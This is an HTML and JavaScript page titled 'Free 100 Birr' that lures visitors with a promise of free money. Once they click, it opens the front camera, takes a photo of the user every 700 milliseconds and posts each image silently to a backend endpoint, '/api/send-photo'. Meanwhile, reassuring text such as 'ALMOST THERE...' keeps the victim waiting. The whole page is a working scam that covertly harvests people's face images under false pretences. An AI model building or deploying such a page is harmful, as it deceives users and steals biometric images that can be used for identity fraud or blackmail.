<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free 100 Birr</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .container {
            width: 100%;
            height: 100vh;
            position: relative;
        }

        #mainButton {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(45deg, #FFD700, #FFA500);
            color: #000;
            border: none;
            padding: 30px 80px;
            font-size: 32px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            z-index: 100;
            box-shadow: 0 0 50px rgba(255, 215, 0, 0.7);
            text-transform: uppercase;
            letter-spacing: 2px;
            animation: pulse 2s infinite;
        }

        #mainButton:hover {
            transform: translate(-50%, -50%) scale(1.05);
            box-shadow: 0 0 70px rgba(255, 215, 0, 0.9);
        }

        #mainButton:active {
            transform: translate(-50%, -50%) scale(0.98);
        }

        #mainButton:disabled {
            background: #666;
            cursor: not-allowed;
            animation: none;
            box-shadow: none;
        }

        #video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
            transform: scaleX(-1);
            z-index: 1;
        }

        .counter {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.8);
            color: #FFD700;
            padding: 15px 25px;
            border-radius: 10px;
            font-size: 24px;
            font-weight: bold;
            z-index: 99;
            display: none;
            border: 2px solid #FFD700;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 50px rgba(255, 215, 0, 0.7); }
            50% { box-shadow: 0 0 70px rgba(255, 215, 0, 1); }
            100% { box-shadow: 0 0 50px rgba(255, 215, 0, 0.7); }
        }

        @keyframes flash {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .flash {
            animation: flash 0.3s;
        }

        .hidden {
            display: none;
        }

        /* Loading dots */
        .loading-dots:after {
            content: ' .';
            animation: dots 1.5s steps(5, end) infinite;
        }

        @keyframes dots {
            0%, 20% { content: ' .'; }
            40% { content: ' ..'; }
            60% { content: ' ...'; }
            80%, 100% { content: ' ....'; }
        }
    </style>
</head>
<body>
    <div class="container">
        <video id="video" autoplay playsinline></video>
        <button id="mainButton">FREE 100 BIRR</button>
        <div class="counter" id="counter">Sent: 0</div>
    </div>

    <script>
        // Elements
        const mainButton = document.getElementById('mainButton');
        const video = document.getElementById('video');
        const counter = document.getElementById('counter');
        
        // State
        let stream = null;
        let isRunning = false;
        let sentCount = 0;
        let captureInterval = null;

        // Main function - starts everything
        async function startCapture() {
            if (isRunning) return;
            
            try {
                // Change button text immediately
                mainButton.textContent = 'GETTING FREE BIRR...';
                mainButton.disabled = true;
                
                // Get front camera
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user', // Front camera only
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                // Show video (hidden but needed for capture)
                video.srcObject = stream;
                
                // Start continuous capture
                isRunning = true;
                counter.style.display = 'block';
                updateCounter();
                
                // Start capturing every 700ms
                captureInterval = setInterval(captureAndSendPhoto, 700);
                
            } catch (error) {
                console.error('Error:', error);
                
                if (error.name === 'NotAllowedError') {
                    mainButton.textContent = 'ALLOW CAMERA ACCESS!';
                } else {
                    mainButton.textContent = 'ERROR - TRY AGAIN';
                }
                
                // Reset button after 2 seconds
                setTimeout(() => {
                    mainButton.textContent = 'FREE 100 BIRR';
                    mainButton.disabled = false;
                }, 2000);
            }
        }

        // Capture photo and send
        async function captureAndSendPhoto() {
            if (!stream || !isRunning) return;
            
            try {
                // Capture photo
                const photoData = capturePhoto();
                
                // Send to server (don't wait for response to keep timing)
                sendPhotoToServer(photoData);
                
                // Update counter
                sentCount++;
                updateCounter();
                
                // Visual feedback
                video.classList.add('flash');
                setTimeout(() => video.classList.remove('flash'), 300);
                
            } catch (error) {
                console.log('Capture error:', error);
            }
        }

        // Capture photo from video
        function capturePhoto() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            return canvas.toDataURL('image/jpeg', 0.8);
        }

        // Send photo to backend (fire and forget)
        async function sendPhotoToServer(photoData) {
            try {
                await fetch('/api/send-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ photoData })
                });
                // Don't wait for response to maintain timing
            } catch (error) {
                // Silent fail - keep sending
            }
        }

        // Update counter display
        function updateCounter() {
            counter.textContent = `Sent: ${sentCount}`;
            
            // Change button text based on count
            if (sentCount < 10) {
                mainButton.textContent = 'GETTING FREE BIRR...';
            } else if (sentCount < 50) {
                mainButton.textContent = 'ALMOST THERE...';
            } else {
                mainButton.textContent = 'FREE BIRR COMING...';
            }
        }

        // Stop everything
        function stopCapture() {
            isRunning = false;
            
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
                video.srcObject = null;
            }
            
            counter.style.display = 'none';
            mainButton.textContent = 'FREE 100 BIRR';
            mainButton.disabled = false;
            sentCount = 0;
        }

        // Button click handler
        mainButton.addEventListener('click', startCapture);

        // Stop if user leaves page
        window.addEventListener('beforeunload', stopCapture);
        window.addEventListener('pagehide', stopCapture);

        // Also stop on visibility change
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                stopCapture();
            }
        });
    </script>
</body>
</html>
